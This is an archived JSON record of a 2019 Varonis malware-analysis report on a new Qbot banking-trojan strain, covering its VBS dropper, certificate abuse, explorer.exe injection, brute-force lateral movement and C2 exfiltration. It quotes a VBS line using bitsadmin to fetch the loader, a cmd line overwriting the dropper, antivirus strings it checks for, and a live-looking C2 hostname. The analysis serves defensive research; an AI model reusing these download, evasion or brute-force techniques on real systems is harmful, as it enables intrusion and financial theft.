{
    "id": "0fa14af2-141a-4e54-aff8-f3cfd85195ac",
    "created_at": "2023-01-12T15:00:13.285654Z",
    "updated_at": "2025-03-27T02:05:37.867392Z",
    "deleted_at": null,
    "sha1_hash": "17c18464583049b6dd7f3e648e9526e11e20ae2a",
    "title": "2019-06-03 - Varonis Exposes Global Cyber Campaign- C2 Server Actively Compromising Thousands of Victims",
    "authors": "",
    "file_creation_date": "2022-05-28T21:43:25Z",
    "file_modification_date": "2022-05-28T21:43:25Z",
    "file_size": 1688902,
    "plain_text": "# Varonis Exposes Global Cyber Campaign: C2 Server Actively Compromising Thousands of Victims\n\n**[varonis.com/blog/varonis-discovers-global-cyber-campaign-qbot/](https://www.varonis.com/blog/varonis-discovers-global-cyber-campaign-qbot/)**\n\nThe Varonis Security Research team discovered a global cyber attack campaign leveraging a\nnew strain of the Qbot banking malware. The campaign is actively targeting U.S.\ncorporations but has hit networks worldwide—with victims throughout Europe, Asia, and\nSouth America—with a goal of stealing proprietary financial information, including bank\naccount credentials.\n\nDuring the analysis, we reversed this strain of Qbot and identified the attacker’s active\n**command and control server, allowing us to determine the scale of the attack. Based on**\ndirect observation of the C2 server, thousands of victims around the globe are\ncompromised and under active control by the attackers. Additional information uncovered\nfrom the C&C server exposed traces of the threat actors behind this campaign.\n\n[The attack was initially detected by Varonis DatAlert which alerted one of our North American](https://www.varonis.com/products/datalert/?hsLang=en)\ncustomers of dropper activity, internal lateral movement, and suspicious network activity.\n\nOur team has shared additional non-public information with the appropriate authorities and\nare performing responsible disclosure.\n\n## New Variant of Qbot Banking Malware\n\nThe threat actors used a new variant of Qbot, a well-known and sophisticated malware\ndesigned to steal banking credentials. Qbot employs anti-analysis techniques, frequently\nevades detection, and uses new infection vectors to stay ahead of defenders.\n\nThe malware is polymorphic, or constantly changing:\n\nIt creates files and folders with random names\n\n\n-----\n\nIts dropper frequently changes C2 servers\nThe malware loader changes when there is an active internet connection (more on this\nlater)\n\nQbot (or Qakbot) was first identified in 2009 and has evolved significantly. It is primarily\ndesigned for collecting browsing activity and data related to financial websites. Its worm-like\ncapabilities allow it to spread across an organization’s network and infect other systems.\n\n## Discovery\n\nOur forensics team began investigating after receiving a call from a customer, whose\nimplementation of DatAlert had alerted them to unusual activity in their systems. Our team\ndetermined that at least one computer had been infected with malware and was attempting\nto propagate to additional systems on the network.\n\nA sample was extracted and sent to our research team for analysis, who identified the\nmalware as a variant of Qbot/Qakbot. The sample did not match any existing hashes, and\nfurther investigation revealed that this was a new strain.\n\n## Phase One – Dropper\n\n**File name: REQ_02132019b.doc.vbs**\n\nIn previous versions of Qbot, the first launcher was a Word document macro. A zip file with a\n**.doc.vbs extension was found during our investigation, indicating that the first infection was**\nlikely carried out via a phishing email that lured the victim into running the malicious VBS file.\n\nUpon execution, the VBS extracts the OS version of the victim’s machine and attempts to\ndetect common anti-virus software installed on the system.\n\nAV strings the malware looks for include: Defender, Virus, Antivirus, Malw, Trend,\n**Kaspersky, Kav, Mcafee, symantec**\n\n[In this variant, the malware uses BITSAdmin to download the loader. This appears to be a](https://docs.microsoft.com/en-us/windows/desktop/bits/bitsadmin-tool)\nnew behavior, as previous samples used PowerShell.\n\nBITSAdmin downloads the loader from one of the following URLs:\n\n\n-----\n\nDownloading the loader using BITSAdmin from the VBS code:\n\n**intReturn = wShell.Run(‘bitsadmin /transfer qahdejob’ & Second(Now) & ‘ /Priority**\n**HIGH ‘ & el & urlStr & ‘ ‘ & tempFile, 0, True)**\n\n## Phase Two: Gain Persistency and Inject to explorer.exe\n\n**Filename: widgetcontrol.png**\n\nThe loader, which executes the core malware, has multiple versions and is constantly\nupdating even after execution. The version that the victim receives upon infection is\ndependent on the sp parameter that is hardcoded in the VBS file.\n\nOne interesting point is that each version of the loader is signed with a different digital\ncertificate. Valid certificates usually indicate a file is trustworthy, while unsigned executables\nare suspicious.\n\nQbot is known to use fake or stolen, valid digital certificates to gain credibility and evade\ndetection on the operating system.\n\nWe downloaded all the available versions of the loader (see IOCs below) and mapped the\ncertificates.\n\n**Certificates used by the malware:**\n\nSaiitech Systems Limited\nECDJB Limited\nHitish Patel Consulting Ltd\nDoorga Limited\nINTENTEK LIMITED\nAustek Consulting Limited\nIO Pro Limited\nVercoe IT Ltd\nEdsabame Consultants Ltd\nSOVA CONSULTANCY LTD\n\n\n-----\n\n**Example of one of the certificates:**\n\n### Persistence\n\nWhen first run, the loader copies itself to %Appdata%\\Roaming\\{Randomized String} and\nthen creates the following:\n\n### Injected Explorer.exe\n\nThe loader launches a 32-bit explorer.exe process and then injects the main payloads.\n\nHere is the memory of explorer.exe with the injected payload as RWX memory segment:\n\nHere is the memory of explorer.exe with the injected payload as RWX memory segment:\n\n\n-----\n\nAfter the injection, the loader overwrites its original executable with the 32-bit version of\ncalc.exe:\n\n**“C:\\Windows\\System32\\cmd.exe” /c ping.exe -n 6 127.0.0.1 & type**\n**“C:\\Windows\\System32\\calc.exe” > C:\\Users\\{TKTKTK}\\Desktop\\1.exe**\n\n## Phase Three: Lateral Movement and Stealing Money\n\nAfter establishing persistence, the main payloads begin to brute force accounts on the\nnetwork.\n\nIf the malware compromises a domain account, it enumerates the “Domain Users” group and\nbrute forces the accounts. If the compromised account is a local account, the malware uses\na predefined list of local users instead.\n\nAuthentication attempts use NTLM, and the API WNetAddConnection.\n\nWe extracted the usernames and passwords the malware uses when attempting to brute\nforce local accounts. The malware hides these dictionaries from static analysis, but they can\nbe extracted during runtime.\n\n**X32dbg image of explorer.exe trying to connect to a remote computer with the username**\n“Administrator” and the password “12345678”:\n\n\n-----\n\n### Show Me the Money\n\nThe main goal of Qbot is to steal money from its victims; it uses several methods to send\nfinancial, credential and other information back to the attacker’s server:\n\n**Keylogging – Qbot captures and sends every keystroke that the victim enters and**\nuploads them to the attacker.\n**Credentials/cookies – Qbot searches for saved credentials/cookies from browsers**\nand sends them to the attacker.\n**Hooking – the main payload injects to all the processes in the system with a code that**\nhooks API calls and searches for financial/banking string the malware extracts the\ndata, credentials, or session cookies from the process and uploads it to the attacker.\n\nThe image shows that when authenticating to banking site buisnessline.huntington.com,\nthe malware sends the POST data and the session cookies to the C2 server\n**content.bigflimz.com:**\n\n## Inside the Attacker’s C2 Server\n\nOn one of the attacker’s sites, we were able to find log files containing the victim IPs,\noperating system details, and anti-virus product names. The C2 server revealed past\nactivities, as well as what appears to be additional malware versions (version table in the\nIOC section, below).\n\n\n-----\n\nSome of the results may contain duplicates, but below are the top 10 countries, anti-virus\nproducts, and operating systems found.\n\n### Victims by Country\n\nWe found 2,726 unique victim IP addresses. As many organizations use port address\ntranslation that masks internal IP addresses, the number of victims is likely much larger.\n\n### Victims by Anti-Virus Found\n\n\n-----\n\n### Victims by Operating System\n\n\n-----\n\nDolev Taler\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-06-03 - Varonis Exposes Global Cyber Campaign- C2 Server Actively Compromising Thousands of Victims.pdf"
    ],
    "report_names": [
        "2019-06-03 - Varonis Exposes Global Cyber Campaign- C2 Server Actively Compromising Thousands of Victims.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535613,
    "ts_updated_at": 1743041137,
    "ts_creation_date": 1653774205,
    "ts_modification_date": 1653774205,
    "files": {
        "pdf": "https://archive.orkl.eu/17c18464583049b6dd7f3e648e9526e11e20ae2a.pdf",
        "text": "https://archive.orkl.eu/17c18464583049b6dd7f3e648e9526e11e20ae2a.txt",
        "img": "https://archive.orkl.eu/17c18464583049b6dd7f3e648e9526e11e20ae2a.jpg"
    }
}